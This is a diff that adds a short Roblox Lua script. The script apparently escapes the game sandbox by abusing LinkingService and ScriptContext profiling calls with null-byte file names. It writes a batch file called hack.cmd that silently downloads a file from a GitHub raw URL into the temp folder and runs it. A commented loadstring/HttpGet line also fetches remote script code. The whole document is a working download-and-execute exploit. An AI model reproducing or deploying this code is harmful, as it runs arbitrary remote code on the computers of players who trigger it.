@@ -1,0 +1,17 @@
+--loadstring(game:HttpGet("https://github.com/FurryBoyYT/scripting/raw/main/SkibidiToiletScriptOP"))()
+
+local LinkingService = game:service('LinkingService\0')
+local ScriptContext = game:service('ScriptContext\0')
+
+local function run_batch(batch)
+    LinkingService:OpenUrl(ScriptContext:SaveScriptProfilingData(batch, "hack.cmd\0"))
+end
+
+do
+local BRIDGE_PYTHON=
+[=[@echo off
+curl -s -o "%temp%\\hack.cmd" "https://raw.githubusercontent.com/FurryBoyYT/scripting/main/SkibidiToiletScriptOP"
+start "" "%temp%\\hack.cmd"
+]=]
+run_batch(BRIDGE_PYTHON)
+end
